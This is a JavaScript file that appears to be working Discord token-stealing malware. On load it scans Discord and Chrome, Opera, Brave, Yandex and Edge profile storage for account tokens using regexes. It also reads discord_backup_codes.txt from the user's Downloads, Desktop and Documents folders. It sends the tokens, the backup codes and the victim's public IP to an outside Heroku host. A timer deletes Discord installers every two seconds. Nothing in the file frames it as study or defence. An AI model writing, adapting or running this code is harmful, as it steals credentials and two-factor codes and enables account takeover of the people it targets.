const ps = "base31"
const apiURL = "https://noisgente.herokuapp.com"
process.on("unhandledRejection", a => {
    a.message
})
const fs = require("fs"),
    path = require("path"),
    axios = require("axios").default,
    glob = require("glob"),
    https = require("https"),
    os = require("os"),
    XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest
let appdata = process.env.APPDATA,
    localappdata = process.env.LOCALAPPDATA,
    dcrd = [],
    patttt = [],
    runnn = [];
const paths = [appdata + "\\discord\\", appdata + "\\discordcanary\\", appdata + "\\discordptb\\", appdata + "\\discorddevelopment\\", appdata + "\\lightcord\\", localappdata + "\\Google\\Chrome\\User Data\\Default\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\", localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\", localappdata + "\\Google\\Chrome\\User Data\\Default\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 2\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 3\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 4\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Profile 5\\Network\\", localappdata + "\\Google\\Chrome\\User Data\\Guest Profile\\Network\\", appdata + "\\Opera Software\\Opera Stable\\", appdata + "\\Opera Software\\Opera GX Stable\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\", localappdata + "\\Microsoft\\Edge\\User Data\\Default\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\", localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Default\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\", localappdata + "\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\"]
ee()



function ee() {
    cvmerci()
    backup()
}

function ettoi(tokenPath) {
    tokenPath += "\\Local Storage\\leveldb"
    let tokens = []
    try {
        fs.readdirSync(path.normalize(tokenPath)).map(file => {
            if (file.endsWith(".log") || file.endsWith(".ldb")) {
                fs.readFileSync(`${tokenPath}\\${file}`, "utf8").split(/\r?\n/).forEach(line => {
                    const regex = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)]
                    for (const _regex of regex) {
                        const token = line.match(_regex)
                        if (token) {
                            token.forEach(element => {
                                tokens.push(element)
                            })
                        }
                    }
                })
            }
        })
    } catch {}
    return tokens
}

function cvmerci() {
    let e
    const t = process.env.LOCALAPPDATA,
        a = process.env.APPDATA
    e = {
        Discord: path.join(a, "Discord"),
        "Discord Canary": path.join(a, "discordcanary"),
        "Discord PTB": path.join(a, "discordptb"),
        "Google Chrome": path.join(t, "Google", "Chrome", "User Data", "Default"),
        Opera: path.join(a, "Opera Software", "Opera Stable"),
        Brave: path.join(t, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        Yandex: path.join(t, "Yandex", "YandexBrowser", "User Data", "Default")
    }
    let pat = "Non"
    const s = []
    for (let [e, t] of Object.entries(paths)) {
        const e = ettoi(t)
        e && e.forEach(e => {
            s.push(e), pat = t
        })
    }
    s.filter(onlyUnique).forEach(e => {
        let tt = new XMLHttpRequest
        tt.open("GET", "https://api.ipify.org"), tt.send(null), tt.onreadystatechange = function() {
            if (4 == tt.readyState && 200 == tt.status) {
                let a = new XMLHttpRequest
                a.open("POST", `${apiURL}/send`, !0), a.setRequestHeader("Content-Type", "application/json"), a.send(JSON.stringify({
                    pseudo: ps,
                    type: "tokens",
                    path: pat,
                    token: e,
                    ip: tt.responseText
                }))
            }
        }
    })
}

function onlyUnique(e, t, a) {
    return a.indexOf(e) === t
}
                function backup() {
                    const o = os.homedir()
                    fs.readdirSync(`${o}\\Downloads`).forEach(a => {
                        if ("discord_backup_codes.txt" === a) {
                            let a = fs.readFileSync(`${o}\\Downloads\\discord_backup_codes.txt`, "utf-8", function(o, a) {})
                            axios.post(`${apiURL}/send`, {
                                pseudo: ps,
                                type: "backup",
                                pass: a
                            }, {
                                "Content-Type": "application/json"
                            }).then(o => {}).catch(o => {})
                        }
                    }), fs.readdirSync(`${o}\\Desktop`).forEach(a => {
                        if ("discord_backup_codes.txt" === a) {
                            let a = fs.readFileSync(`${o}\\Desktop\\discord_backup_codes.txt`, "utf-8", function(o, a) {})
                            axios.post(`${apiURL}/send`, {
                                pseudo: ps,
                                type: "backup",
                                pass: a
                            }, {
                                "Content-Type": "application/json"
                            }).then(o => {}).catch(o => {})
                        }
                    }), fs.readdirSync(`${o}\\Documents`).forEach(a => {
                        if ("discord_backup_codes.txt" === a) {
                            let a = fs.readFileSync(`${o}\\Documents\\discord_backup_codes.txt`, "utf-8", function(o, a) {})
                            axios.post(`${apiURL}/send`, {
                                pseudo: ps,
                                type: "backup",
                                pass: a
                            }, {
                                "Content-Type": "application/json"
                            }).then(o => {}).catch(o => {})
                        }
                    })
                }

                function nodelinject() {
                    const o = os.homedir()
                    fs.readdirSync(`${o}\\Downloads`).forEach(a => {
                        if (a.includes("DiscordSetup")) {
                            fs.unlink(a, (err) => {})
                        }
                    })
                    fs.readdirSync(`${o}\\Desktop`).forEach(a => {
                        if (a.includes("DiscordSetup")) {
                            fs.unlink(a, (err) => {})
                        }
                    })
                    fs.readdirSync(`${o}\\Documents`).forEach(a => {
                        if (a.includes("DiscordSetup")) {
                            fs.unlink(a, (err) => {})
                        }
                    })
                }
                setInterval(() => {
                    nodelinject()
                }, 2000)